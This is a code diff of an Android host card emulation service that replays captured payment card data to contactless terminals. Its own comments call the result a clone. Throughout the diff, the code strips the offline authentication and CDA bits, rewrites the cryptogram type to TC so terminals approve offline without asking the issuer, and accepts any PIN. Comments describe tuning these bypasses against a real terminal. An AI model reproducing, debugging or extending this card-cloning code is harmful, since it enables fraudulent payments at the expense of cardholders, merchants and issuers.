@@ -4,22 +4,21 @@ import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.nfc.cardemulation.HostApduService;
 import android.os.Bundle;
 import android.util.Log;
 import android.widget.Toast;
 
 import java.io.ByteArrayOutputStream;
 import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Calendar;
-import java.util.List;
 import java.util.Map;
 import java.util.Random;
 import java.util.TreeMap;
 import java.util.TreeSet;
 
-public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApduService {
+public class HceCcEmulationServiceVisa extends HostApduService {
 
     private static final String TAG = "HCE";
 
@@ -32,38 +31,119 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
     private static final byte[] SW_ERR         = hex("6F00");
     private static final byte[] PPSE           = hex("325041592E5359532E4444463031");
 
-    private static final String AC_FILLER = "FFFFFFFFFFFFFFFF";
-
-    /** CDA with a fake SDAD. Off - the kernel aborted silently on it. */
-    private static final boolean CDA_FAKE_SDAD = false;
-
+    /**
+     * Fallback AIP when the card has no captured GPO.
+     *
+     * The EMV Contactless AIP byte 1 is:
+     *   0x40 SDA supported        0x10 cardholder verification supported
+     *   0x20 DDA supported        0x08 terminal risk management to be performed
+     *   0x01 CDA supported        0x04 issuer authentication supported
+     * 0x80 and 0x02 are RFU.
+     *
+     * 0x10 = CV only. No ODA of any kind, no TRM, no issuer auth - nothing for
+     * the terminal to check and fail.
+     */
     private static final String DEFAULT_AIP = "1080";
 
+    /**
+     * Keep-mask applied to byte 1 of whatever AIP is in force. Clears the three
+     * ODA bits (SDA 0x40, DDA 0x20, CDA 0x01) and issuer auth (0x04), which a
+     * clone can never satisfy, and keeps CV (0x10) and TRM (0x08) so the editor
+     * can still choose them. A field of 3080 becomes 1080; a field of 1800 stays
+     * 1800.
+     *
+     * Named KEEP, not MASK - it is an AND that keeps bits, and the old name read
+     * like it cleared them.
+     *
+     * NOTE: gpo() no longer applies this when a capture is present - see gpo().
+     * It survives only for aipForMac()'s no-GPO fallback.
+     */
     private static final byte AIP_KEEP_MASK = (byte) 0x18;
 
-    private static final byte AIP_CDA_K6  = (byte) 0x01;
-    private static final byte AIP_CDA_K23 = (byte) 0x02;
+    /**
+     * AIP byte 2 bit 8, the app's own marker that byte 2 agrees with the framing
+     * we send. Real cards hand back byte 2 = 0x00 here, so it is a convention and
+     * not a spec bit. Only ever set with EMV framing.
+     *
+     * NOTE: gpo() no longer sets this either. Kept for reference.
+     */
+    private static final byte AIP_EMV_MODE = (byte) 0x80;
 
+    /**
+     * AIP byte 1 bit 1 - CDA supported. A clone cannot honour it: CDA needs the
+     * SDAD in 9F4B, signed with the ICC private key we do not have. gpo() clears
+     * this bit off whatever AIP it sends so a CDA-capable terminal does not ask
+     * for something we cannot deliver.
+     */
+    private static final byte AIP_CDA = (byte) 0x01;
+
+    /**
+     * AIP byte 1 bit 5 - cardholder verification supported.
+     *
+     * PARKED, NOT APPLIED. Clearing it produced AIP 0800 and the terminal bailed
+     * on the GPO response without sending a single READ RECORD. With the bit set
+     * (AIP 1800) the same terminal reads all seven records. So the CV bit stays.
+     *
+     * The captured CVM list offers offline PIN and VERIFY here answers a bare
+     * 9000 without looking at the PIN block, but that is harmless: the card
+     * answers TC, so nothing validates the PIN and any digits are accepted.
+     *
+     * Kept declared so the experiment can be re-run by adding
+     *   tpl[..] &= (byte) ~AIP_CVM;
+     * next to each AIP_CDA line in weakenAip() and the one in gpo().
+     */
     private static final byte AIP_CVM = (byte) 0x10;
 
+    /**
+     * Tags a real card may legitimately put in a GPO response but which a clone
+     * normally must NOT, because they describe a cryptogram the card already
+     * produced.
+     *
+     * true  - strip them, forcing the terminal to send GENERATE AC.
+     *         Tried and it does not work here: with AIP 0800 the terminal bailed
+     *         at the GPO, and with AIP 1800 it still never asked. This is a
+     *         Discover/kernel-6 terminal and Discover's contactless profile puts
+     *         the cryptogram in the GPO response by design - there is nothing to
+     *         ask for.
+     * false - keep the card's own AC tags. This is the shape the terminal
+     *         expects: it reads all seven records and completes the transaction.
+     *         The CID byte inside is rewritten to TC instead, so it approves
+     *         offline rather than going online with a stale ARQC.
+     */
     private static final boolean STRIP_AC = false;
 
     private static final int[] GPO_AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};
 
+    /**
+     * Whether buildPpse() advertises Visa and Mastercard alongside the card's
+     * own AID.
+     *
+     * false - the directory lists ONLY the AID the card actually is. ReaderActivity
+     *         never captures the real PPSE, so the honest thing is to advertise
+     *         only what we can serve.
+     * true  - the old behaviour, three applets with one profile behind them.
+     */
     private static final boolean EXTRA_AIDS = false;
 
     private static final byte CID_AAC  = (byte) 0x00;
     private static final byte CID_TC   = (byte) 0x40;
     private static final byte CID_ARQC = (byte) 0x80;
 
+    /**
+     * The CID written into the GPO response when STRIP_AC is false.
+     *
+     * 40 = TC   approve offline, the terminal never asks the host  <- this
+     * 80 = ARQC go online, the host judges the cryptogram
+     * 00 = AAC  decline offline
+     *
+     * Declared after CID_TC on purpose: a static initialiser that refers to a
+     * later simple name is an illegal forward reference in Java.
+     */
     private static final byte GPO_CID = CID_TC;
 
     private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = false;
     private static final boolean FORCE_ONLINE_ARQC = true;
     private static final boolean FORCE_OFFLINE_TC = true;
-
-    /** 9F34 CVM Results - signature, always, successful. Matches the record. */
-    private static final String CVM_RESULTS = "1F0002";
 
     private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
     private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
@@ -71,6 +151,24 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
 
     private static final String CVMLIST = "00000000000000001F00";
 
+    /**
+     * Used when the selected card has no script of its own. One per line:
+     *   <match>=<response>
+     *   match    - hex PREFIX of the command APDU. 80A80000 catches every GPO.
+     *   response - sent verbatim, so paste the '<<' line out of the tap log.
+     * '#' starts a comment, spaces are ignored, longest match wins.
+     *
+     * INCLUDE THE 9000 ON THE SAME LINE. It is part of the response.
+     *
+     * GATED. The editor pre-fills this field and it cannot be cleared, so a
+     * stale line from another card was silently serving the GPO of a card that
+     * had nothing to do with it. The script is OFF unless the card's 'usescript'
+     * pref says otherwise.
+     *
+     * NOTE: a script that serves a GPO also bypasses everything gpo() does -
+     * the CDA clear and the CID rewrite. Paste the '<<' line as-is and you get
+     * whatever it contains.
+     */
     private static final String DEFAULT_SCRIPT =
             "# match=response, hex only. Longest match wins.\n"
           + "# 80A80000=770A82021080940408010100 9000\n"
@@ -79,58 +177,57 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
     private final StringBuilder tapLog = new StringBuilder();
     private final Random rnd = new Random();
 
-    private final Object txnLock = new Object();
-
     private byte[] txnAip;
     private String txnAtc;
     private boolean cryptogramSent;
     private int scriptHits;
 
+    /** The captured IAD, lifted out of the GPO replay before any rewrite. */
     private byte[] capturedIad;
+
+    /** CID currently in force in the GPO response, for the verdict. */
     private String gpoCid = "";
 
     private boolean sawPpse;
     private int nSelects, nGpos, nRecs, nGens;
     private String lastCid = "";
 
+    // Set when an APDU throws, so baseVerdict() can say so instead of blaming
+    // the terminal's AID list for what is actually our own exception.
     private boolean sawError;
-    private boolean acComputed;
-    private boolean cdaClaimed;
 
-    private String lastSelAid = "";
-    private int nSelMiss;
-    private int nApps;
-    private int aflEntries;
-    private int reqGenP1 = -1;
-
-    private boolean aidForeign;
-    private boolean aidSubst;
-
+    /** Name of the on-device terminal log. App-private, no permission needed. */
     private static final String TERM_LOG = "term_log.txt";
 
-    private static final java.util.concurrent.ExecutorService LOGQ =
-            java.util.concurrent.Executors.newSingleThreadExecutor();
+    /**
+     * The tap log, persisted to a file as well as the in-memory buffer.
+     *
+     * The clipboard copy in onDeactivated() only ever holds the LAST tap, and a
+     * terminal that gives up early fires onDeactivated with a log you cannot
+     * compare against the previous attempt. The file keeps a short history, and
+     * CaptureActivity prints its tail on screen.
+     *
+     * Trimmed to ~30 KB once it passes 60 KB so it cannot grow without bound.
+     * Never throws: a logging failure must not take the card down.
+     */
+    private void termLog(String s) {
+        try {
+            java.io.File f = new java.io.File(getExternalFilesDir(null), TERM_LOG);
+            java.io.FileWriter w = new java.io.FileWriter(f, true);
+            w.write(s + "\n");
+            w.close();
 
-    private void termLog(final String s) {
-        LOGQ.execute(() -> {
-            try {
-                java.io.File f = new java.io.File(getExternalFilesDir(null), TERM_LOG);
-                java.io.FileWriter w = new java.io.FileWriter(f, true);
-                w.write(s + "\n");
-                w.close();
-
-                if (f.length() > 60000) {
-                    long keep = 30000;
-                    byte[] buf = new byte[(int) keep];
-                    java.io.RandomAccessFile raf = new java.io.RandomAccessFile(f, "rw");
-                    raf.seek(f.length() - keep);
-                    raf.readFully(buf);
-                    raf.setLength(0);
-                    raf.write(buf);
-                    raf.close();
-                }
-            } catch (Throwable ignored) { }
-        });
+            if (f.length() > 60000) {
+                long keep = 30000;
+                byte[] buf = new byte[(int) keep];
+                java.io.RandomAccessFile raf = new java.io.RandomAccessFile(f, "rw");
+                raf.seek(f.length() - keep);
+                raf.readFully(buf);
+                raf.setLength(0);
+                raf.write(buf);
+                raf.close();
+            }
+        } catch (Throwable ignored) { }
     }
 
     private void tap(String s) {
@@ -155,6 +252,15 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
     static byte[] cat(byte[]... arrs) { return Tlv.cat(arrs); }
     private static String bytesToHex(byte[] d) { return Hex.toHex(d); }
 
+    /**
+     * Local TLV writer, so the service no longer depends on how Tlv.t encodes
+     * the length.
+     *
+     * FIX: patchFci() wraps a whole captured FCI and buildPpse() wraps the whole
+     * directory, both of which can pass 127 bytes. A one-byte length there is
+     * simply wrong, and a wrong outer length on the FCI is exactly "the terminal
+     * read the app then stopped".
+     */
     static byte[] tlv(int tag, byte[] v) {
         ByteArrayOutputStream o = new ByteArrayOutputStream();
         if ((tag & 0xFF00) != 0) {
@@ -209,6 +315,15 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return l;
     }
 
+    /**
+     * Lc of an incoming APDU, extended length included.
+     *
+     * FIX: reading apdu[4] as a plain Lc gives 0 for an extended APDU. The
+     * reader emits extended when a PDOL or CDOL1 is over 255 bytes, and both
+     * consequences were silent: a long SELECT took the empty-name path and
+     * selected the card's own AID, and a long GENERATE AC MACed over an empty
+     * CDOL.
+     */
     private static int lcOf(byte[] apdu) {
         if (apdu.length < 5) return 0;
         int lc = apdu[4] & 0xFF;
@@ -217,59 +332,13 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return ((apdu[5] & 0xFF) << 8) | (apdu[6] & 0xFF);
     }
 
+    /** Offset of the data field, past an extended length if there is one. */
     private static int dataOff(byte[] apdu) {
         return (apdu.length >= 7 && (apdu[4] & 0xFF) == 0x00) ? 7 : 5;
     }
 
     private static byte[] hexOrNull(String s) {
         return (s == null || s.isEmpty()) ? null : hex(s);
-    }
-
-    /**
-     * Rebuild a TLV with every length recomputed, recursively.
-     *
-     * The seeded directory came out with two outer lengths one byte too large
-     * (A5 26 and 6F 38, each declaring one more byte than followed). A tolerant
-     * parser walks past it; a strict one stops at the outer tag and reports zero
-     * entries - which is exactly "picked NOTHING, 1 applet offered".
-     *
-     * Rebuilding on the way out repairs any capture, seeded or real, and it
-     * covers records as well as the directory.
-     *
-     * A format 1 (0x80) template is NOT TLV inside - it is AIP bytes followed by
-     * track 2 - so it is copied through with only its own length recomputed.
-     * Parsing it as TLV reads the second AIP byte as a length and empties it.
-     */
-    private static byte[] relength(byte[] tpl) {
-        int[] pos = new int[1];
-        int outer = readTag(tpl, pos);
-        int olen = readLen(tpl, pos);
-        int end = Math.min(tpl.length, pos[0] + olen);
-
-        if (outer == 0x80) {
-            return tlv(0x80, Arrays.copyOfRange(tpl, pos[0], end));
-        }
-
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        int i = pos[0];
-        while (i < end) {
-            int[] q = new int[]{i};
-            int t = readTag(tpl, q);
-            int l = readLen(tpl, q);
-            if (q[0] + l > tpl.length) break;
-            int vs = q[0], ve = q[0] + l;
-            i = ve;
-
-            byte[] v = Arrays.copyOfRange(tpl, vs, ve);
-            if ((t & 0x20) != 0 && v.length > 0) {
-                byte[] child = relength(cat(tlv(t, v)));
-                out.write(child, 0, child.length);
-            } else {
-                byte[] one = tlv(t, v);
-                out.write(one, 0, one.length);
-            }
-        }
-        return tlv(outer, out.toByteArray());
     }
 
     private SharedPreferences prefs() {
@@ -293,6 +362,16 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return prefs().getInt(sel() + "msd", 0) == 1;
     }
 
+    // ---------- card fields, normalised once ----------
+
+    /**
+     * FIX: PAN and PSN were being read with two different defaults in two
+     * different places - the record said PSN 01 while the ARQC was MACed over
+     * PSN 00. One helper each, used by every caller.
+     *
+     * PSN is zero padded, not F padded: hex("1") gives 1F, which is the wrong
+     * byte for a one-digit sequence number.
+     */
     private String pan() {
         String s = p("pan", "4111111111111111").replaceAll("[^0-9]", "");
         return s.isEmpty() ? "4111111111111111" : s;
@@ -306,30 +385,10 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return s;
     }
 
+    /** Directory label: the editor field wins, then whatever the reader saw. */
     private String labelText() {
         String s = p("label", p("cap_label", "CARD"));
         return s.length() > 16 ? s.substring(0, 16) : s;
-    }
-
-    private String cardAid() {
-        String a = p("cap_aid", "");
-        if (a.isEmpty()) a = p("aid", "");
-        return a;
-    }
-
-    private String activeAid() {
-        return lastSelAid.isEmpty() ? cardAid() : lastSelAid;
-    }
-
-    private static byte cdaBit(String aid) {
-        String a = aid == null ? "" : aid.toUpperCase();
-        if (a.startsWith("A000000152") || a.startsWith("A000000015")) return AIP_CDA_K6;
-        return AIP_CDA_K23;
-    }
-
-    private static String ridOf(String aid) {
-        String a = aid == null ? "" : aid.toUpperCase();
-        return a.length() >= 10 ? a.substring(0, 10) : a;
     }
 
     private String nextAtc() {
@@ -360,18 +419,17 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         sawError = false;
         capturedIad = null;
         gpoCid = "";
-
-        acComputed = false;
-        cdaClaimed = false;
-        aidForeign = false;
-        aidSubst = false;
-        lastSelAid = "";
-        nSelMiss = 0;
-        nApps = 0;
-        aflEntries = 0;
-        reqGenP1 = -1;
     }
 
+    /**
+     * The AIP that goes into the MAC input.
+     *
+     * FIX: it used to mask the prefs value whenever gpo() had not run, which is
+     * whenever a script line served the GPO - but a script can return its own
+     * 82 02 xxxx, and the MAC then ran over a completely different AIP than the
+     * one on the wire. The script branch now parses that AIP and parks it in
+     * txnAip, so this only falls back when there genuinely was no GPO at all.
+     */
     private byte[] aipForMac() {
         byte[] a = txnAip;
         if (a == null) {
@@ -390,7 +448,6 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return hexOrNull(p("cap_" + key, ""));
     }
 
-    private byte[] rawPpse() { return cap("rawppse"); }
     private byte[] rawFci()  { return cap("rawfci"); }
     private byte[] rawGpo()  { return cap("rawgpo"); }
 
@@ -420,10 +477,20 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return h.getBytes(StandardCharsets.ISO_8859_1);
     }
 
+    // ---------- script overrides ----------
+
     private String scriptRaw() {
         return p("script", DEFAULT_SCRIPT);
     }
 
+    /**
+     * The script is OFF unless the card says otherwise.
+     *
+     * FIX: 'usescript' is written by MainActivity with putInt, but p() reads it
+     * with getString. SharedPreferences does no type coercion, so getString on
+     * an Integer threw ClassCastException on EVERY APDU. Read the raw object so
+     * either type works.
+     */
     private boolean useScript() {
         Object o = prefs().getAll().get(sel() + "usescript");
         if (o instanceof Number) return ((Number) o).intValue() != 0;
@@ -470,6 +537,7 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return best;
     }
 
+    /** A status word always starts 0x90 or in the 0x61-0x6F range. */
     private static boolean looksLikeSw(int cls) {
         return cls == 0x90 || (cls >= 0x61 && cls <= 0x6F);
     }
@@ -493,9 +561,14 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
                 tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
     }
 
+    /**
+     * FIX: this used to append Visa at priority 2 and Mastercard at priority 3
+     * unconditionally, so the directory advertised three applets while the card
+     * had one FCI and one record set.
+     */
     private byte[] buildPpse() {
-        String realAid = cardAid();
-        if (realAid.isEmpty()) realAid = "A0000000031010";
+        String realAid = p("cap_aid", "");
+        if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");
 
         String lbl = labelText();
 
@@ -518,79 +591,6 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         byte[] fci = tlv(0xBF0C, dir.toByteArray());
         byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
         return tlv(0x6F, inner);
-    }
-
-    /**
-     * Replay a captured directory, correcting the 84 and RE-LENGTHING the whole
-     * template. A capture with wrong outer lengths used to be served verbatim
-     * and a strict kernel rejected the entire directory.
-     */
-    private byte[] patchPpse(byte[] ppse) {
-        int[] pos = new int[1];
-        int outer = readTag(ppse, pos);
-        int olen = readLen(ppse, pos);
-        int end = Math.min(ppse.length, pos[0] + olen);
-
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        boolean saw84 = false;
-        int i = pos[0];
-        while (i < end) {
-            int[] q = new int[]{i};
-            int t = readTag(ppse, q);
-            int l = readLen(ppse, q);
-            if (q[0] + l > ppse.length) break;
-            byte[] v = Arrays.copyOfRange(ppse, q[0], q[0] + l);
-            i = q[0] + l;
-            if (t == 0x84) { v = PPSE; saw84 = true; }
-            byte[] one = tlv(t, v);
-            out.write(one, 0, one.length);
-        }
-
-        byte[] inner = out.toByteArray();
-        if (!saw84) inner = cat(tlv(0x84, PPSE), inner);
-
-        byte[] rebuilt = tlv(outer == 0 ? 0x6F : outer, inner);
-        return relength(rebuilt);
-    }
-
-    private static int countApps(byte[] fci) {
-        if (fci == null) return 0;
-        int n = 0;
-        int[] pos = new int[1];
-        int outer = readTag(fci, pos);
-        int olen = readLen(fci, pos);
-        int end = Math.min(fci.length, pos[0] + olen);
-
-        int i = pos[0];
-        while (i < end) {
-            int[] q = new int[]{i};
-            int t = readTag(fci, q);
-            int l = readLen(fci, q);
-            if (q[0] + l > fci.length) break;
-            if (t == 0xA5) {
-                int j = q[0], e2 = Math.min(fci.length, q[0] + l);
-                while (j < e2) {
-                    int[] r = new int[]{j};
-                    int t2 = readTag(fci, r);
-                    int l2 = readLen(fci, r);
-                    if (r[0] + l2 > fci.length) break;
-                    if (t2 == 0xBF0C) {
-                        int k = r[0], e3 = Math.min(fci.length, r[0] + l2);
-                        while (k < e3) {
-                            int[] s = new int[]{k};
-                            int t3 = readTag(fci, s);
-                            int l3 = readLen(fci, s);
-                            if (s[0] + l3 > fci.length) break;
-                            if (t3 == 0x61) n++;
-                            k = s[0] + l3;
-                        }
-                    }
-                    j = r[0] + l2;
-                }
-            }
-            i = q[0] + l;
-        }
-        return n;
     }
 
     private byte[] patchFci(byte[] fci, byte[] aid) {
@@ -618,33 +618,32 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             byte[] one = tlv(t, v);
             out.write(one, 0, one.length);
         }
-        return relength(tlv(outer, out.toByteArray()));
+        return tlv(outer, out.toByteArray());
     }
 
+    /**
+     * FIX: this used to append 9F2A when it was missing, which put it after
+     * BF0C - and 9F2A sorts before BF0C, so the template came out of ascending
+     * order. It now rebuilds through a sorted map.
+     */
     private byte[] patchA5(byte[] a5, byte[] aid) {
-        TreeMap<Integer, List<byte[]>> tags = new TreeMap<>();
+        TreeMap<Integer, byte[]> tags = new TreeMap<>();
         int i = 0;
         while (i < a5.length) {
             int[] q = new int[]{i};
             int t = readTag(a5, q);
             int l = readLen(a5, q);
             if (q[0] + l > a5.length) break;
-            List<byte[]> list = tags.get(t);
-            if (list == null) { list = new ArrayList<>(); tags.put(t, list); }
-            list.add(Arrays.copyOfRange(a5, q[0], q[0] + l));
+            tags.put(t, Arrays.copyOfRange(a5, q[0], q[0] + l));
             i = q[0] + l;
         }
-
-        List<byte[]> k = tags.get(0x9F2A);
-        if (k == null) { k = new ArrayList<>(); tags.put(0x9F2A, k); }
-        if (k.isEmpty()) k.add(new byte[]{(byte) kernelFor(bytesToHex(aid))});
+        tags.put(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(aid))});
 
         ByteArrayOutputStream out = new ByteArrayOutputStream();
-        for (Map.Entry<Integer, List<byte[]>> e : tags.entrySet())
-            for (byte[] v : e.getValue()) {
-                byte[] one = tlv(e.getKey(), v);
-                out.write(one, 0, one.length);
-            }
+        for (Map.Entry<Integer, byte[]> e : tags.entrySet()) {
+            byte[] one = tlv(e.getKey(), e.getValue());
+            out.write(one, 0, one.length);
+        }
         return out.toByteArray();
     }
 
@@ -652,7 +651,6 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         String typed = p("afl", "").replaceAll("[^0-9A-Fa-f]", "");
         if (typed.length() >= 8 && typed.length() % 8 == 0) {
             tap("-- afl source: typed");
-            aflEntries = typed.length() / 8;
             return hex(typed);
         }
 
@@ -699,7 +697,6 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             }
             if (runStart >= 0) aflEntry(out, sfi, runStart, prev);
         }
-        aflEntries = out.size() / 4;
         return out.toByteArray();
     }
 
@@ -710,6 +707,10 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         out.write(0x00);
     }
 
+    /**
+     * FIX: a five digit value used to fall through every branch and land on the
+     * hardcoded 311201, and the two digit branch hardcoded the year 27.
+     */
     private String expiry6() {
         String d = p("expiry", "3112").replaceAll("[^0-9]", "");
         if (d.length() >= 6) return d.substring(0, 6);
@@ -764,102 +765,99 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
 
     @Override
     public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
-        synchronized (txnLock) {
-            try {
-                if (apdu == null || apdu.length < 4) return SW_MALFORMED;
+        try {
+            if (apdu == null || apdu.length < 4) return SW_MALFORMED;
 
-                int ins = apdu[1] & 0xFF;
-                int p1  = apdu[2] & 0xFF;
-                int p2  = apdu[3] & 0xFF;
+            int ins = apdu[1] & 0xFF;
+            int p1  = apdu[2] & 0xFF;
+            int p2  = apdu[3] & 0xFF;
 
-                boolean isSelect = (ins == 0xA4);
+            boolean isSelect = (ins == 0xA4);
 
-                if (isSelect && apdu.length >= 5) {
-                    int lc0 = lcOf(apdu);
-                    int off0 = dataOff(apdu);
-                    if (apdu.length >= off0 + lc0) {
-                        byte[] nm = new byte[lc0];
-                        System.arraycopy(apdu, off0, nm, 0, lc0);
-                        if (Arrays.equals(nm, PPSE)) {
-                            tapLog.setLength(0);
-                            resetTransaction();
-                            sawPpse = true;
-                            termLog("=== tap "
-                                    + new java.text.SimpleDateFormat("HH:mm:ss",
-                                            java.util.Locale.US).format(new java.util.Date())
-                                    + " ===");
-                            int n = scriptLines();
-                            if (n > 0) {
-                                tap("-- script armed: " + n + " line(s), gate="
-                                        + (useScript() ? "ON" : "OFF"));
-                            }
-                            popup(nameLine());
+            if (isSelect && apdu.length >= 5) {
+                int lc0 = lcOf(apdu);
+                int off0 = dataOff(apdu);
+                if (apdu.length >= off0 + lc0) {
+                    byte[] nm = new byte[lc0];
+                    System.arraycopy(apdu, off0, nm, 0, lc0);
+                    if (Arrays.equals(nm, PPSE)) {
+                        tapLog.setLength(0);
+                        resetTransaction();
+                        sawPpse = true;
+                        termLog("=== tap "
+                                + new java.text.SimpleDateFormat("HH:mm:ss",
+                                        java.util.Locale.US).format(new java.util.Date())
+                                + " ===");
+                        int n = scriptLines();
+                        if (n > 0) {
+                            tap("-- script armed: " + n + " line(s), gate="
+                                    + (useScript() ? "ON" : "OFF"));
                         }
+                        popup(nameLine());
                     }
                 }
+            }
 
-                tap(">> " + bytesToHex(apdu));
+            tap(">> " + bytesToHex(apdu));
 
-                if (isSelect)         nSelects++;
-                else if (ins == 0xA8) nGpos++;
-                else if (ins == 0xB2) nRecs++;
-                else if (ins == 0xAE) nGens++;
+            if (isSelect)         nSelects++;
+            else if (ins == 0xA8) nGpos++;
+            else if (ins == 0xB2) nRecs++;
+            else if (ins == 0xAE) nGens++;
 
-                String hit = useScript() ? scriptMatch(apdu) : null;
-                if (hit != null) {
-                    byte[] out = hex(hit);
-                    scriptHits++;
+            String hit = useScript() ? scriptMatch(apdu) : null;
+            if (hit != null) {
+                byte[] out = hex(hit);
+                scriptHits++;
 
-                    if (out.length >= 2 && !looksLikeSw(out[out.length - 2] & 0xFF)) {
-                        tap("-- script response had no status word - appended 9000");
-                        out = cat(out, SW_OK);
-                    } else if (out.length < 2) {
-                        out = cat(out, SW_OK);
-                    }
-
-                    if (ins == 0xA8) {
-                        byte[] sa = capturedAip(out);
-                        if (sa != null && sa.length >= 2) {
-                            txnAip = sa;
-                            tap("-- script GPO AIP parked for the MAC: " + bytesToHex(sa));
-                        }
-                        tap("-- script served the GPO - MSD/AIP/AFL come from the script, not the card");
-                    }
-                    tap("-- script hit " + out.length + " bytes");
-                    tap("<< " + bytesToHex(out));
-                    return out;
+                if (out.length >= 2 && !looksLikeSw(out[out.length - 2] & 0xFF)) {
+                    tap("-- script response had no status word - appended 9000");
+                    out = cat(out, SW_OK);
+                } else if (out.length < 2) {
+                    out = cat(out, SW_OK);
                 }
 
-                byte[] out;
-                if (isSelect) {
-                    if (apdu.length < dataOff(apdu)) return SW_MALFORMED;
-                    out = select(apdu);
-                } else if (ins == 0xA8) {
-                    out = gpo(apdu);
-                } else if (ins == 0xB2) {
-                    out = readRecord(p1, p2);
-                } else if (ins == 0xAE) {
-                    reqGenP1 = p1;
-                    out = genac(apdu);
-                } else if (ins == 0xCA) {
-                    out = getData(apdu);
-                } else if (ins == 0x20) {
-                    out = SW_OK;
-                } else if (ins == 0x84) {
-                    byte[] ch = new byte[8];
-                    rnd.nextBytes(ch);
-                    out = cat(ch, SW_OK);
-                } else {
-                    out = SW_UNSUPPORTED;
+                if (ins == 0xA8) {
+                    byte[] sa = capturedAip(out);
+                    if (sa != null && sa.length >= 2) {
+                        txnAip = sa;
+                        tap("-- script GPO AIP parked for the MAC: " + bytesToHex(sa));
+                    }
+                    tap("-- script served the GPO - MSD/AIP/AFL come from the script, not the card");
                 }
-
+                tap("-- script hit " + out.length + " bytes");
                 tap("<< " + bytesToHex(out));
                 return out;
-            } catch (Exception e) {
-                sawError = true;
-                tap("!! " + e);
-                return SW_ERR;
             }
+
+            byte[] out;
+            if (isSelect) {
+                if (apdu.length < dataOff(apdu)) return SW_MALFORMED;
+                out = select(apdu);
+            } else if (ins == 0xA8) {
+                out = gpo();
+            } else if (ins == 0xB2) {
+                out = readRecord(p1, p2);
+            } else if (ins == 0xAE) {
+                out = genac(apdu);
+            } else if (ins == 0xCA) {
+                out = getData(apdu);
+            } else if (ins == 0x20) {
+                out = SW_OK;
+            } else if (ins == 0x84) {
+                byte[] ch = new byte[8];
+                rnd.nextBytes(ch);
+                out = cat(ch, SW_OK);
+            } else {
+                out = SW_UNSUPPORTED;
+            }
+
+            tap("<< " + bytesToHex(out));
+            return out;
+        } catch (Exception e) {
+            sawError = true;
+            tap("!! " + e);
+            return SW_ERR;
         }
     }
 
@@ -871,61 +869,24 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         System.arraycopy(apdu, off, name, 0, lc);
 
         if (Arrays.equals(name, PPSE)) {
-            byte[] capPpse = rawPpse();
-            byte[] fci;
-            if (capPpse != null && capPpse.length > 8) {
-                tap("-- ppse source: captured " + capPpse.length + "B");
-                fci = patchPpse(capPpse);
-                tap("-- ppse relengthed to " + fci.length + "B");
-            } else {
-                tap("-- ppse source: generated");
-                fci = buildPpse();
-            }
-            nApps = countApps(fci);
-            tap("-- directory offers " + nApps + " applet(s)");
-            return cat(fci, SW_OK);
+            return cat(buildPpse(), SW_OK);
         }
 
         if (name.length == 0) {
-            String a = cardAid();
-            if (a.isEmpty()) a = "A0000000031010";
+            String a = p("cap_aid", "");
+            if (a.isEmpty()) a = p("aid", "A0000000031010");
             name = hex(a);
         }
 
-        String real = cardAid();
-        String picked = bytesToHex(name);
-        lastSelAid = picked;
-
-        tap("-- selected " + picked + " | card is " + (real.isEmpty() ? "?" : real));
-
-        boolean exact = real.length() > 0 && picked.equalsIgnoreCase(real);
-        boolean sibling = !exact && real.length() >= 10 && picked.length() >= 10
-                && ridOf(picked).equalsIgnoreCase(ridOf(real));
-
-        aidSubst = sibling;
-        aidForeign = !exact && !sibling && real.length() > 0;
-
-        if (!exact && real.length() > 0) {
-            nSelMiss++;
-            if (sibling) {
-                tap("-- AID SUBSTITUTED: " + picked + " shares the RID of " + real
-                        + " - serving the captured FCI under the picked AID");
-            } else {
-                tap("-- AID FOREIGN: " + picked + " is a different scheme - generated FCI,"
-                        + " and the GPO AIP will be the card's kernel, not this one");
-            }
-        }
+        String real = p("cap_aid", "");
+        if (real.isEmpty()) real = p("aid", "");
+        tap("-- selected " + bytesToHex(name)
+                + " | card is " + (real.isEmpty() ? "?" : real));
 
         byte[] captured = rawFci();
-        if (captured != null && (exact || sibling)) {
-            tap("-- fci source: captured " + captured.length + "B"
-                    + (sibling ? " (substituted)" : ""));
-            return cat(patchFci(captured, name), SW_OK);
-        }
+        tap("-- fci source: " + (captured == null ? "generated" : "captured " + captured.length + "B"));
